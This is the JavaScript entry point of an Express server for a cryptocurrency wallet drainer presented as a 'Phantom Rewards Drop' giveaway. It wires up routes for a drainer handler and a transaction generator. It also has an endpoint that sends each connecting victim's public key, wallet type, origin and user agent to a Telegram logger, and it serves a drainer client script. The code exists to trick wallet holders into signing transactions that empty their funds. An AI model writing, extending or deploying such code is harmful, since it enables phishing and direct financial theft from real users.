import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import generateTxHandler from './src/pages/api/generateTx.js';
import drainerHandler from './api/drainer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/generateTx', async (req, res) => {
  await generateTxHandler(req, res);
});

// Standalone drainer API endpoint
app.get('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.post('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.options('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

// Wallet logging endpoint
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, walletType, origin, userAgent } = req.body;
    
    // Import telegram logger
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    // Log wallet connection
    await telegramLogger.logWalletConnection({
      publicKey: publicKey,
      walletType: walletType,
      origin: origin,
      userAgent: userAgent
    });
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error logging wallet connection:', error);
    res.status(500).json({ error: 'Failed to log wallet connection' });
  }
});

// Serve logo.png with correct content type
app.get('/logo.png', (req, res) => {
  res.setHeader('Content-Type', 'image/png');
  res.sendFile(path.join(__dirname, 'public', 'logos', 'logo.png'));
});

// Serve index.html from public directory
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Phantom Rewards Drop: http://localhost:${PORT}`);
  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/generateTx`);
  console.log(`🔗 Standalone Drainer API: http://localhost:${PORT}/api/drainer`);
  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
}); 